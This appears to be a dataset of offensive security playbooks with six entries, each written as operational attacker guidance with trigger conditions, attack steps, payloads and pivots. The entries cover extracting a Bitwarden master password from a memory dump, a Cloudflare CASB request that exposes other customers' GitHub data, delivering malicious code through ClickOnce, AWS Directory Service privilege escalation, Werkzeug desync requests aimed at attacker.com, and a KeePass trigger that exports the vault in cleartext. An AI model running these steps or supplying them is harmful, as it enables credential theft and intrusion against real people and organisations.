meta.title: Hunting for Bitwarden master passwords stored in memory

trigger_conditions.when_to_apply: This technique is applicable when an attacker has local access to a machine where the Bitwarden desktop client is installed and running.
prerequisites: Bitwarden desktop client must be installed and running on the target machine.
Attacker must have the ability to execute commands or access memory on the target machine.
applicability_signals: Bitwarden process is running in task manager.
User has recently interacted with the Bitwarden client.
skip_if: Bitwarden client is not installed or not running.
Attacker does not have local execution capabilities.

recon_steps: Step 1: Identify the Bitwarden process running on the target system using task manager or `ps` command.
Step 2: Use a memory dumping tool (e.g., ProcDump) to capture a memory dump of the Bitwarden process.
attack_steps: Step 1: Execute ProcDump with the Bitwarden process ID (PID) to create a memory dump. Example: `procdump -ma <PID> dump.dmp`
Step 2: Analyze the captured memory dump (dump.dmp) using a hex editor or memory analysis tools.
Step 3: Search for potential master password strings within the memory dump. Common search patterns might include password-like character sets or known password components.
payloads_or_patterns: Search for patterns matching common password complexity (e.g., alphanumeric, special characters).
Look for strings that resemble the user's actual master password if known through other means (e.g., phishing, password reuse).
tools_recommended: ProcDump (Sysinternals Suite): For capturing memory dumps.
Hex Editor (e.g., HxD, Bless): For manual inspection of memory dumps.
Volatility Framework or other memory analysis tools: For more sophisticated analysis and string extraction.
success_indicators: Discovery of the Bitwarden master password as a clear-text string within the memory dump.
Successfully decrypting a vault entry using the found master password.
failure_indicators: The master password is not found in the memory dump in clear text. This might indicate that Bitwarden uses more robust memory protection or encryption for the master password. Pivot to other attack vectors.
The memory dump is corrupted or unreadable.

playbooks.impact: An attacker with local access can extract the Bitwarden master password from memory, granting them access to all stored secrets within the user's vault. This could lead to compromise of all accounts secured by Bitwarden.
playbooks.key_lesson: When analyzing desktop applications that handle sensitive credentials, always investigate for potential in-memory credential leakage by capturing and analyzing process memory dumps.

meta.title: Confused Deputy Vulnerability in Cloudflare CASB

trigger_conditions.when_to_apply: When an attacker can create or access a Cloudflare account and wants to view sensitive information from other Cloudflare CASB customers' GitHub organizations.
prerequisites: Attacker has a Cloudflare account.
Target organization has integrated Cloudflare CASB with their GitHub account.
applicability_signals: The presence of the `/api/v4/accounts/<ACCOUNT_ID>/casb/integrations` endpoint.
The integration process involves an OAuth flow with GitHub.
The API expects a `credentials.code` field, which might be mistreated.
skip_if: Cloudflare CASB does not support GitHub integrations.
The API enforces strict validation of the `credentials.code` field.

recon_steps: Step 1: Identify potential target Cloudflare accounts or Cloudflare CASB GitHub App installation IDs. This can be done by observing network traffic during the OAuth setup for Cloudflare CASB, or by analyzing JavaScript files for clues about the integration process. The writeup mentions GitHub app installation IDs are incrementing integers.
Step 2: If possible, identify an existing Cloudflare CASB GitHub integration ID for a victim user/organization.
attack_steps: Step 1: Create a new Cloudflare account if one is not already possessed by the attacker.
Step 2: Initiate the GitHub integration process within the attacker's Cloudflare account.
Step 3: Intercept the POST request sent to `https://dash.cloudflare.com/api/v4/accounts/<ATTACKER_ACCOUNT_ID>/casb/integrations`.

Step 4: Modify the JSON payload to include the `policy_id` associated with GitHub integrations and, crucially, replace the attacker's `credentials.code` (which should be the GitHub App Installation ID for the attacker's own GitHub org) with a target victim's GitHub App Installation ID. Example payload: `{"name":"My GitHub Integration","policy_id":"3d5f554c-f630-4ffa-ab94-c5047f9d8e3a","credentials":{"code":"<VICTIM_INSTALLATION_ID>"}}`
Step 5: Send the modified POST request.
Step 6: Access the CASB findings within the attacker's Cloudflare dashboard. If successful, sensitive information from the victim's GitHub organization will be displayed.
tools_recommended: Burp Suite (or similar proxy) for intercepting and modifying HTTP requests.
A script (e.g., Python, Bash) to enumerate GitHub app installation IDs and automate the attack requests.
success_indicators: The POST request to `/api/v4/accounts/<ATTACKER_ACCOUNT_ID>/casb/integrations` returns a 2xx status code.
Sensitive information from the victim's GitHub organization (e.g., organization members, repository names, employee emails, SharePoint file links) appears in the attacker's Cloudflare CASB dashboard.
failure_indicators: The POST request returns a 4xx or 5xx error code, indicating an invalid request or server-side issue.

The CASB findings in the attacker's dashboard remain empty or do not display data from the victim's organization. Pivot: Try enumerating different types of GitHub App installation IDs or look for other integration types within Cloudflare CASB that might suffer from similar validation flaws.

playbooks.impact: An attacker can view sensitive information about other customers' Microsoft and GitHub organizations. This includes employee names/emails, links to SharePoint files, repository names/descriptions, and information about organization members without 2FA enabled. This data can be used for further targeted attacks, such as social engineering or credential stuffing.
playbooks.key_lesson: When integrating third-party services via OAuth, ensure that sensitive tokens or identifiers (like installation IDs) are strictly validated against the authenticated user's session and are not directly usable to access other users' resources.

meta.title: Less SmartScreen More Caffeine: (Ab)Using ClickOnce for Trusted Code Execution

trigger_conditions.when_to_apply: This technique is applicable when a user is tricked into installing or running a ClickOnce application, which is often perceived as a trusted installation method.
prerequisites: Attacker can deliver a malicious ClickOnce application package to the target user.
Target user has the ability to execute installers or run ClickOnce applications.
applicability_signals: Observation of ClickOnce installation prompts or successful installations of ClickOnce applications on a target system.
The presence of .application files that, when executed, initiate a ClickOnce deployment.
skip_if: The target system has strict application whitelisting or execution policies that prevent the installation or execution of unsigned or untrusted ClickOnce applications.
ClickOnce is explicitly disabled or not configured on the target environment.

recon_steps: Step 1: Identify if the target environment utilizes ClickOnce for application deployment by observing system configurations or known application installation methods.
Step 2: Analyze existing ClickOnce application manifests (.application, .manifest) to understand their structure and how they reference application assemblies.
attack_steps: Step 1: Craft a malicious application assembly (e.g., a .NET executable) that performs the desired malicious actions.
Step 2: Create or modify a ClickOnce application manifest (.manifest) to point to the malicious assembly as a prerequisite or part of the application.
Step 3: Create or modify a ClickOnce application deployment manifest (.application) to reference the modified .manifest file.
Step 4: Package the malicious assemblies and manifests into a ClickOnce deployment.
Step 5: Social engineer the target user to download and execute the malicious .application file, typically by presenting it as a legitimate application update or installer.
Step 6: Once executed, the ClickOnce deployment process will download and run the trusted application, executing the malicious code in the context of the user.
payloads_or_patterns: Example malicious .NET assembly code that executes commands or establishes persistence.
Structure of ClickOnce .manifest and .application files, specifying how to include custom assemblies.
tools_recommended: Visual Studio or other .NET development tools for creating malicious assemblies.
Manifest generation tools or manual editing for ClickOnce manifests.
Phishing or social engineering tools for delivery.
success_indicators: Execution of the malicious code on the target system (e.g., command prompt appears, network connection established, file creation).
The malicious application is installed and running without triggering immediate security alerts or user suspicion.
failure_indicators: ClickOnce security warnings that prevent installation due to untrusted publisher or unsigned assemblies.
Antivirus or EDR solutions detecting and blocking the malicious assembly or the ClickOnce process.
User manually aborting the installation due to unexpected prompts or warnings.

playbooks.impact: Achieve trusted code execution on the target system under the user's privileges. This can lead to further compromise, such as data exfiltration, lateral movement, or persistence.
playbooks.key_lesson: Leverage the trust inherent in application deployment technologies like ClickOnce by delivering malicious code disguised as legitimate software updates or installations.

meta.title: Spotted: How we discovered Privilege Escalation, missing CloudTrail data and a race condition in AWS Directory Service

affected_components: IAM role assignment within AWS Directory Service
CloudTrail logging for console access enablement/disablement

trigger_conditions.when_to_apply: This playbook is applicable when an authenticated user has the `ds:EnableRoleAccess` permission in AWS Directory Service, and the target environment uses IAM roles with trust relationships with AWS Directory Service.
prerequisites: Attacker has an authenticated AWS account.
Attacker possesses the `ds:EnableRoleAccess` permission.
Target AWS account has an IAM role with a trust relationship with AWS Directory Service.
applicability_signals: Presence of the `ds:EnableRoleAccess` permission for the attacker's user/role.
Existence of IAM roles in the target account that can be assumed by AWS Directory Service.
skip_if: Attacker lacks `ds:EnableRoleAccess` permission.
No IAM roles with AWS Directory Service trust relationships are found.

recon_steps: Step 1: Verify attacker's current IAM permissions for AWS Directory Service. Look for `ds:EnableRoleAccess`.
Step 2: Enumerate available IAM roles in the target AWS account and check their trust relationships to see if AWS Directory Service is a trusted principal.
attack_steps: Step 1: Using the AWS CLI or SDK, attempt to assign a user to an existing IAM role that has a trust relationship with AWS Directory Service, leveraging the `ds:EnableRoleAccess` permission. The specific API call is `AuthorizeApplication` or similar, targeting an application related to AWS Directory Service console access.
Step 2: If the assignment is successful, the attacker's assumed role will inherit the permissions of the assigned IAM role.
Step 3: (For CloudTrail issue) Test enabling and disabling AWS Directory Service console access and observe CloudTrail logs to confirm if these actions are logged. If not, report the missing logs.
payloads_or_patterns: aws ds authorize-application --directory-id <TARGET_DIRECTORY_ID> --application-id <APPLICATION_ID> --target-role-arn <TARGET_ROLE_ARN>
tools_recommended: AWS CLI: `aws ds list-directories`, `aws iam list-roles`, `aws iam get-role --role-name <ROLE_NAME>` (to inspect trust relationships). `aws ds authorize-application` (with appropriate parameters)
AWS SDKs (Python Boto3, etc.) for scripting the attack.
success_indicators: The `ds:AuthorizeApplication` API call succeeds without requiring `iam:PassRole` permissions for the attacker's principal.
The attacker's IAM principal can now assume the target IAM role and execute actions permitted by that role, even if they didn't initially have `iam:PassRole`.
Observation of `ds.amazonaws.com` API calls in browser developer console when enabling/disabling console access.
Absence of CloudTrail logs for enabling/disabling AWS Directory Service console access.
failure_indicators: API calls to `ds:AuthorizeApplication` fail with permission denied errors, specifically related to insufficient `ds:EnableRoleAccess` or `iam:PassRole`.
No IAM roles with appropriate trust relationships are found in the target account.

playbooks.impact: Privilege escalation: An authenticated user with `ds:EnableRoleAccess` can gain elevated privileges by assuming an IAM role with administrative or sensitive permissions. Missing CloudTrail logs: Undermines auditability and incident response capabilities, as critical actions within AWS Directory Service are not recorded.
playbooks.key_lesson: Always verify that AWS services properly enforce `iam:PassRole` permissions and audit critical configuration changes for services like AWS Directory Service to ensure comprehensive logging.

meta.title: Abusing Client-Side Desync on Werkzeug
meta.vuln_type: HTTP Request Smuggling | Open Redirect | XSS | Account Takeover

trigger_conditions.when_to_apply: This technique is applicable when a web application uses a vulnerable version of Werkzeug (2.1.0 to 2.1.1) and has a feature that is susceptible to client-side desync attacks, such as an open redirect or XSS vulnerability that can be triggered by a malformed POST request.
prerequisites: Target application must be using Werkzeug versions 2.1.0 to 2.1.1 (inclusive).
An observable vulnerability such as an open redirect or XSS that can be exploited by manipulating HTTP requests.
applicability_signals: Response headers indicating Werkzeug is in use.
Application logic that processes POST requests with potentially unhandled parameters.
Presence of an open redirect or XSS vulnerability.
skip_if: The target application uses Werkzeug version 2.1.2 or later.
No observable open redirect or XSS vulnerabilities are present.

recon_steps: Step 1: Fingerprint the Werkzeug version by checking response headers or examining the HTML source for JavaScript files (e.g., `/static/js/main.js`). Identify if the version is within the vulnerable range (2.1.0-2.1.1).
Step 2: Analyze the application for potential open redirect or XSS vulnerabilities by submitting various GET and POST requests with suspicious parameters.
attack_steps: Step 1: Craft a POST request to the application's root endpoint (`/`) with specific parameters designed to cause a desync in Werkzeug's HTTP request parsing. The goal is to corrupt the processing of the subsequent legitimate request.

Step 2: Immediately following the desync-inducing POST request, send a second request designed to exploit the open redirect or XSS vulnerability, leveraging the desync to bypass security checks or alter the request's intended target.
Step 3: For open redirect, use a payload that redirects to a malicious domain. For XSS, inject a JavaScript payload that executes in the user's browser.
Step 4: If the exploit involves session hijacking, ensure the malicious request can capture or reuse the user's session token.
payloads_or_patterns:
POST / HTTP/1.1
Host: <TARGET_URL>
Content-Length: 1

A
GET /malicious.html HTTP/1.1
Host: attacker.com

 (Example for open redirect/XSS)

POST / HTTP/1.1
Host: <TARGET_URL>
Content-Length: 1


GET /static/js/main.js HTTP/1.1
Host: <TARGET_URL>

 (Example to trigger desync for subsequent requests)
tools_recommended: Burp Suite: To craft and send specific HTTP requests, modify headers, and analyze responses.
Custom Python script: For automating the sending of desync-inducing requests followed by exploit requests.
success_indicators: For open redirect: The browser is redirected to the attacker-controlled domain (`attacker.com`).
For XSS: The injected JavaScript executes, e.g., an `alert()` box appears or sensitive data is exfiltrated.
Successful account takeover is confirmed if the attacker can gain access to the user's session or perform actions on their behalf.
failure_indicators: Receiving a 400 Bad Request or unexpected error code, indicating the desync attempt failed or the server is not vulnerable.
Subsequent requests are processed normally without any desync effect, meaning the HTTP parsing is not vulnerable.
WAF blocks the malicious request.

playbooks.impact: Account takeover through XSS, enabling attackers to steal user sessions, perform actions on behalf of the user, or inject malicious content. Potential for data theft and further compromise.
playbooks.key_lesson: Always verify the exact version of server-side components like Werkzeug, as even minor version differences can introduce critical vulnerabilities like HTTP request smuggling or client-side desync.

meta.title: KeePass Triggers Are Dead, Long Live KeePass Triggers!

trigger_conditions.when_to_apply: When an attacker has write access to the KeePass configuration file (KeePass.config.xml) on a target system and can control the KeePass application's triggers.
prerequisites: Attacker has write access to KeePass.config.xml
Target system has KeePass installed and running
Attacker can influence or modify the KeePass.config.xml file (e.g., via file write vulnerability, lateral movement)
applicability_signals: Existence of KeePass.config.xml with a TriggerSystem.Triggers section.
Ability to write to KeePass.config.xml without elevated privileges (indicating a potential misconfiguration or a prior compromise).
skip_if: KeePass.config.xml is read-only or inaccessible.
KeePass version is 2.53.1 or later, which prompts for the master key before export.

recon_steps: Step 1: Identify if KeePass is installed on the target system.
Step 2: Locate the KeePass.config.xml configuration file. Common locations include %APPDATA%\KeePass\KeePass.config.xml or the application directory.
Step 3: Attempt to gain write access to KeePass.config.xml. This might involve exploiting file permission misconfigurations, or if already post-exploitation with admin rights, directly modifying it.
attack_steps: Step 1: Construct a malicious trigger XML snippet that defines an 'Export active database' action.
Step 2: Specify an output file path and format (e.g., KeePass CSV (1.x) or KeePass XML (2.x)) that will write the database contents to a location accessible by the attacker.
Step 3: Insert the malicious trigger XML into the `<Triggers>` section within the `<TriggerSystem>` of the target's KeePass.config.xml file.
Step 4: Wait for the target user to launch KeePass. The trigger will execute upon loading the configuration, exporting the database to the specified cleartext format.
Step 5: Retrieve the exported cleartext database file from the specified path.
payloads_or_patterns:
<Trigger>
  <Guid>JuPkdhoKfEGAbGTr10Cmbw==</Guid>
  <Name>export</Name>
  <TurnOffAfterAction>true</TurnOffAfterAction>
  <Events>
    <Event>
      <TypeGuid>5f8TBoW4QYm5BvaeKztApw==</TypeGuid>
      <Parameters>
        <Parameter>0</Parameter>
        <Parameter />
      </Parameters>

tools_recommended: Text editor (e.g., VS Code, Notepad++) for creating and editing XML.
File system enumeration tools to locate KeePass.config.xml and determine write permissions.
Tools for lateral movement or privilege escalation if write access to KeePass.config.xml is not directly available.
success_indicators: The presence of a cleartext export file (e.g., attacker_export.csv) in the attacker-defined location.
The content of the exported file contains entries from the KeePass database (usernames, passwords, URLs, etc.).
failure_indicators: KeePass.config.xml cannot be modified (e.g., read-only). Suggestion: look for other configuration manipulation vectors.
KeePass version is too recent and prompts for master key, preventing export. Suggestion: look for other post-exploitation techniques for credential access.
The trigger does not execute or the export file is not created. Suggestion: verify XML syntax, event type, and action parameters.

playbooks.impact: Extraction of all credentials stored within the victim's KeePass database in cleartext format.
playbooks.key_lesson: Always investigate the possibility of manipulating application configuration files, especially when they control critical functions like triggering actions, as they can be a vector for credential exfiltration.
